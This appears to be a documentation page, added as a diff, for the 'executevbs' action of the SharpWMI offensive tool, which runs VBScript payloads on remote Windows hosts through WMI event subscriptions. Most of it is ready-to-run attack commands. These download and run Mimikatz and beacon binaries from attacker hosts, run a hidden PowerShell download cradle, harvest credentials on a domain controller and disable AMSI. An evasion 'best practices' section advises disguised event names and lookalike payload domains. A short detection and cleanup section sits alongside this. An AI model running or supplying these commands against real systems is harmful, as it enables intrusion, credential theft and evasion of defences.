@@ -1,0 +1,498 @@
+---
+title: 'executevbs'
+description: 'Execute VBScript payloads via WMI event subscriptions'
+icon: 'file-code'
+---
+
+## Overview
+
+The `executevbs` action executes VBScript payloads through WMI event subscriptions using `ActiveScriptEventConsumer`. This provides a flexible method for remote code execution with support for downloading scripts, executing commands, and delayed triggers.
+
+<Warning>
+  This action creates WMI event subscriptions that persist until cleaned up. SharpWMI automatically removes artifacts after execution, but failed operations may leave traces.
+</Warning>
+
+## Syntax
+
+```bash
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=NAME] [amsi=disable] [trigger=SECONDS] [timeout=SECONDS] [username=DOMAIN\user] [password=Password]
+```
+
+## Parameters
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `action` | Yes | Must be `executevbs` |
+| `computername` | No | Target host(s), comma-separated |
+| `eventname` | No | Name for WMI event subscription. Default: "Debug" |
+| `trigger` | No | Seconds before script executes. Default: 10 |
+| `timeout` | No | Script kill timeout in seconds. Default: 12 |
+| `amsi` | No | Set to `disable` to bypass AMSI |
+| `username` | No | Username for authentication |
+| `password` | No | Password for authentication |
+
+## Script Specification Methods
+
+SharpWMI offers 8 different methods to specify VBScript payloads:
+
+### Method A: Execute Command via VBScript
+
+Execute an OS command through preset VBScript template:
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com command="notepad.exe" eventname="Update"
+```
+
+The VBScript template:
+```vbscript
+Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & computer & "\root\cimv2")
+Set proc = GetObject("winmgmts:root\cimv2:Win32_Process")
+proc.Create "COMMAND", Null, conf, intProcessID
+```
+
+### Method B: Download PowerShell Script and Execute
+
+Download PowerShell from URL and execute via stdin:
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com url="http://attacker.com/Invoke-Mimikatz.ps1" eventname="Update"
+```
+
+The VBScript downloads the script and pipes it to PowerShell's stdin.
+
+### Method C: Download Binary and Execute
+
+Download binary, save to disk, and execute:
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com url="http://attacker.com/beacon.exe,%TEMP%\update.exe" eventname="Update"
+```
+
+Format: `url="SOURCE_URL,TARGET_PATH"`
+
+### Method D: Download Binary and Execute Custom Command
+
+Download binary and execute with custom parameters:
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com url="http://attacker.com/payload.exe,%TEMP%\svc.exe" command="%TEMP%\svc.exe -c 192.168.1.100" eventname="Update"
+```
+
+### Method E: Execute VBScript from File
+
+Read VBScript from file and execute:
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com script="C:\payloads\script.vbs" eventname="Update"
+```
+
+### Method F: Execute Inline VBScript
+
+Execute VBScript code directly:
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com script="CreateObject(\"WScript.Shell\").Run(\"notepad.exe\")" eventname="Update"
+```
+
+### Method G: Execute Base64-Encoded VBScript
+
+Base64-decode and execute VBScript:
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com scriptb64="Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuKCJub3RlcGFkLmV4ZSIp" eventname="Update"
+```
+
+### Method H: Execute Base64-Encoded Script from File
+
+Read base64-encoded VBScript from file:
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com scriptb64="C:\payloads\script.vbs.b64" eventname="Update"
+```
+
+## Usage Examples
+
+### Basic VBScript Execution
+
+<CodeGroup>
+```bash Simple Command
+SharpWMI.exe action=executevbs computername=target.domain.com command="notepad.exe" eventname="MyEvent"
+```
+
+```bash With AMSI Evasion
+SharpWMI.exe action=executevbs computername=target.domain.com command="powershell.exe -c Get-Process" eventname="Debug" amsi=disable
+```
+
+```bash With Credentials
+SharpWMI.exe action=executevbs computername=target.domain.com command="cmd /c whoami" eventname="Test" username="DOMAIN\admin" password="Password123!"
+```
+
+```bash Custom Timing
+SharpWMI.exe action=executevbs computername=target.domain.com command="notepad.exe" eventname="Update" trigger=5 timeout=10
+```
+</CodeGroup>
+
+### Download and Execute Scenarios
+
+<CodeGroup>
+```bash Download PowerShell Script
+SharpWMI.exe action=executevbs computername=target.domain.com url="http://192.168.1.100/Invoke-Mimikatz.ps1" eventname="WindowsUpdate" amsi=disable
+```
+
+```bash Download Binary
+SharpWMI.exe action=executevbs computername=target.domain.com url="http://192.168.1.100/beacon.exe,%TEMP%\svchost.exe" eventname="Update"
+```
+
+```bash Download and Execute with Args
+SharpWMI.exe action=executevbs computername=target.domain.com url="http://192.168.1.100/payload.exe,%TEMP%\update.exe" command="%TEMP%\update.exe -c2 192.168.1.100" eventname="Maintenance"
+```
+</CodeGroup>
+
+### Advanced VBScript Usage
+
+<CodeGroup>
+```bash Inline VBScript
+SharpWMI.exe action=executevbs computername=target.domain.com script="CreateObject(\"WScript.Shell\").Run(\"cmd /c whoami > C:\temp\out.txt\")" eventname="Debug"
+```
+
+```bash From File
+SharpWMI.exe action=executevbs computername=target.domain.com script="C:\payloads\reverse-shell.vbs" eventname="Update" amsi=disable
+```
+
+```bash Base64 Encoded
+# Encode VBScript first
+$vbs = 'CreateObject("WScript.Shell").Run("notepad.exe")'
+$bytes = [Text.Encoding]::UTF8.GetBytes($vbs)
+$encoded = [Convert]::ToBase64String($bytes)
+
+# Execute
+SharpWMI.exe action=executevbs computername=target.domain.com scriptb64="$encoded" eventname="Test"
+```
+</CodeGroup>
+
+## How It Works
+
+<Steps>
+  <Step title="Create Timer Object">
+    Creates `__IntervalTimerInstruction` to trigger after specified delay
+  </Step>
+
+  <Step title="Create Event Filter">
+    Sets up `__EventFilter` to monitor for timer events
+  </Step>
+
+  <Step title="Create Event Consumer">
+    Creates `ActiveScriptEventConsumer` with VBScript payload
+  </Step>
+
+  <Step title="Bind Filter to Consumer">
+    Creates `__FilterToConsumerBinding` to link filter and consumer
+  </Step>
+
+  <Step title="Wait for Execution">
+    Waits for trigger time (default 10 seconds)
+  </Step>
+
+  <Step title="Cleanup">
+    Removes timer, filter, consumer, and binding
+  </Step>
+</Steps>
+
+<Accordion title="WMI Event Subscription Details">
+  The execution flow:
+  1. `__IntervalTimerInstruction` fires after `trigger` seconds
+  2. `__EventFilter` matches the timer event
+  3. `ActiveScriptEventConsumer` executes VBScript
+  4. Script runs with `KillTimeout` of `timeout` seconds
+  5. All WMI objects are deleted after execution
+
+  This leaves minimal artifacts compared to persistent WMI backdoors.
+</Accordion>
+
+## Timing Parameters
+
+<Tabs>
+  <Tab title="Default Timing">
+    ```bash
+    # Default: trigger after 10 seconds, timeout after 12 seconds
+    SharpWMI.exe action=executevbs computername=target command="notepad.exe"
+    ```
+
+    Script executes 10 seconds after subscription creation.
+  </Tab>
+
+  <Tab title="Fast Execution">
+    ```bash
+    # Trigger after 5 seconds, timeout after 8 seconds
+    SharpWMI.exe action=executevbs computername=target command="notepad.exe" trigger=5 timeout=8
+    ```
+
+    Useful for quick execution with immediate cleanup.
+  </Tab>
+
+  <Tab title="Delayed Execution">
+    ```bash
+    # Trigger after 60 seconds, timeout after 120 seconds
+    SharpWMI.exe action=executevbs computername=target command="notepad.exe" trigger=60 timeout=120
+    ```
+
+    Allows time for operator to disconnect before execution.
+  </Tab>
+</Tabs>
+
+<Note>
+  `timeout` should always be greater than `trigger` to allow the script to execute before being killed.
+</Note>
+
+## Operational Scenarios
+
+### Scenario 1: Stealthy Beacon Deployment
+
+```bash
+# Download and execute beacon with delay
+SharpWMI.exe action=executevbs computername=target.domain.com url="http://192.168.1.100/beacon.exe,%TEMP%\WindowsUpdate.exe" eventname="WindowsUpdate" trigger=30 timeout=40 amsi=disable username="DOMAIN\admin" password="Password123!"
+```
+
+### Scenario 2: Credential Harvesting
+
+```bash
+# Download and execute Mimikatz
+SharpWMI.exe action=executevbs computername=dc.domain.com url="http://192.168.1.100/Invoke-Mimikatz.ps1" eventname="SecurityUpdate" amsi=disable trigger=10 timeout=60
+```
+
+### Scenario 3: Custom VBScript Payload
+
+```bash
+# Execute custom VBScript for lateral movement
+$vbs = @'
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
+'@
+
+SharpWMI.exe action=executevbs computername=target.domain.com script="$vbs" eventname="Update" amsi=disable
+```
+
+### Scenario 4: Multiple Target Execution
+
+```bash
+# Execute across multiple systems
+SharpWMI.exe action=executevbs computername=ws01,ws02,ws03,ws04 url="http://192.168.1.100/script.ps1" eventname="Maintenance" amsi=disable trigger=5 timeout=15
+```
+
+## Remote vs Local Usage
+
+<Tabs>
+  <Tab title="Local Execution">
+    ```bash
+    # Execute on localhost (rarely used)
+    SharpWMI.exe action=executevbs command="notepad.exe" eventname="Test"
+    ```
+
+    **Note:** Local execution via WMI event subscriptions is uncommon. Use `exec` action for local commands.
+  </Tab>
+
+  <Tab title="Remote Execution">
+    ```bash
+    # Primary use case
+    SharpWMI.exe action=executevbs computername=target.domain.com command="notepad.exe" eventname="Update"
+    ```
+
+    **Requirements:**
+    - Admin privileges on target
+    - WMI access over network
+    - Ports 135 and dynamic RPC open
+  </Tab>
+</Tabs>
+
+## AMSI Evasion
+
+When `amsi=disable` is specified:
+
+<Steps>
+  <Step title="Registry Modification">
+    Sets `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable` to 0
+  </Step>
+
+  <Step title="VBScript Execution">
+    VBScript runs with AMSI disabled
+  </Step>
+
+  <Step title="Registry Restoration">
+    Original AMSI value is restored after cleanup
+  </Step>
+</Steps>
+
+```bash
+SharpWMI.exe action=executevbs computername=target.domain.com url="http://attacker.com/script.ps1" eventname="Update" amsi=disable
+```
+
+## Detection Considerations
+
+<Warning>
+  WMI event subscriptions are a high-fidelity indicator of malicious activity and are heavily monitored.
+</Warning>
+
+<AccordionGroup>
+  <Accordion title="WMI Event Subscription Detection" icon="radar">
+    - Event ID 5858: WMI permanent event subscription
+    - Event ID 5859: WMI event filter activity
+    - Event ID 5861: WMI event consumer registration
+    - Sysmon Event ID 19: WMI event filter activity
+    - Sysmon Event ID 20: WMI event consumer activity
+    - Sysmon Event ID 21: WMI event consumer to filter binding
+  </Accordion>
+
+  <Accordion title="VBScript Execution Detection" icon="file-code">
+    - `wscript.exe` or `cscript.exe` spawned by `scrcons.exe`
+    - Parent process: `scrcons.exe` (Script Event Consumer)
+    - Event ID 4688: Process creation with suspicious parent
+    - ActiveScriptEventConsumer with encoded scripts
+  </Accordion>
+
+  <Accordion title="Network Detection" icon="network-wired">
+    - WMI queries to `root\subscription` namespace
+    - Creation of `__EventFilter`, `ActiveScriptEventConsumer`, `__FilterToConsumerBinding`
+    - Multiple WMI connections in succession
+    - DCOM traffic patterns consistent with WMI operations
+  </Accordion>
+
+  <Accordion title="AMSI Detection" icon="shield">
+    - Registry modification to `AmsiEnable` key
+    - Event ID 4657: Registry value modification
+    - Temporary AMSI bypass in user context
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Event Naming" icon="tag">
+    - Use legitimate-sounding event names
+    - Avoid obvious names like "Backdoor" or "Shell"
+    - Use Windows Update, Maintenance, Debug
+    - Randomize names across operations
+  </Card>
+
+  <Card title="Timing Strategy" icon="clock">
+    - Use delays to avoid immediate detection
+    - Allow time to disconnect before execution
+    - Set appropriate timeout values
+    - Don't use excessively long delays
+  </Card>
+
+  <Card title="Payload Delivery" icon="download">
+    - Use HTTPS for downloads when possible
+    - Host payloads on legitimate-looking domains
+    - Use URL shorteners or redirectors
+    - Verify downloads with checksums in VBScript
+  </Card>
+
+  <Card title="Cleanup" icon="broom">
+    - Let SharpWMI handle automatic cleanup
+    - Verify subscriptions are removed
+    - Check for orphaned event consumers
+    - Monitor for failed cleanup operations
+  </Card>
+</CardGroup>
+
+## Comparison with exec Action
+
+| Feature | executevbs | exec |
+|---------|------------|------|
+| Execution Method | WMI Event Subscription | Win32_Process.Create |
+| Timing | Delayed (configurable) | Immediate |
+| Payload Type | VBScript | Command line |
+| Artifacts | Event subscriptions | Process creation |
+| Complexity | Higher | Lower |
+| Flexibility | Very high | Moderate |
+| Detection Risk | Higher (event subs monitored) | Moderate |
+| Use Case | Complex payloads, downloads | Simple commands |
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Exception in Creating Timer Object">
+    **Cause:** WMI permissions or service issue
+
+    **Solution:**
+    - Verify WMI service is running
+    - Check admin privileges
+    - Test with local WMI query first
+    - Verify `root\cimv2` namespace access
+  </Accordion>
+
+  <Accordion title="Exception in Setting Event Filter">
+    **Cause:** Subscription namespace access denied
+
+    **Solution:**
+    - Ensure admin rights on target
+    - Check `root\subscription` namespace permissions
+    - Verify WMI filter quota not exceeded
+    - Try different event name
+  </Accordion>
+
+  <Accordion title="Script Doesn't Execute">
+    **Cause:** Timeout too short or script error
+
+    **Solution:**
+    - Increase `timeout` parameter
+    - Test VBScript locally first
+    - Check for syntax errors
+    - Verify URLs are accessible from target
+  </Accordion>
+
+  <Accordion title="AMSI Evasion Failed">
+    **Cause:** Insufficient privileges or EDR blocking
+
+    **Solution:**
+    - Verify admin context
+    - Check for EDR protecting registry
+    - Try alternative AMSI bypass
+    - Test registry modification manually
+  </Accordion>
+</AccordionGroup>
+
+## Related Actions
+
+<CardGroup cols={2}>
+  <Card title="exec" icon="terminal" href="/ghostpack-docs/SharpWMI-mdx/actions/exec">
+    Simpler command execution method
+  </Card>
+  <Card title="upload" icon="upload" href="/ghostpack-docs/SharpWMI-mdx/actions/upload">
+    Upload files before VBS execution
+  </Card>
+  <Card title="query" icon="database" href="/ghostpack-docs/SharpWMI-mdx/actions/query">
+    Verify event subscriptions
+  </Card>
+  <Card title="ps" icon="list" href="/ghostpack-docs/SharpWMI-mdx/actions/ps">
+    Check for script execution
+  </Card>
+</CardGroup>
+
+## Additional Resources
+
+<Accordion title="Check for Existing Event Subscriptions">
+  ```bash
+  # List event filters
+  SharpWMI.exe action=query query="SELECT Name,Query FROM __EventFilter" namespace="root\subscription"
+
+  # List event consumers
+  SharpWMI.exe action=query query="SELECT Name,ScriptText FROM ActiveScriptEventConsumer" namespace="root\subscription"
+
+  # List bindings
+  SharpWMI.exe action=query query="SELECT Filter,Consumer FROM __FilterToConsumerBinding" namespace="root\subscription"
+  ```
+</Accordion>
+
+<Accordion title="Manual Cleanup (if needed)">
+  ```powershell
+  # Remove event filter
+  Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='EventName'" | Remove-WmiObject
+
+  # Remove event consumer
+  Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name='EventName'" | Remove-WmiObject
+
+  # Remove binding
+  Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match 'EventName' } | Remove-WmiObject
+  ```
+</Accordion>
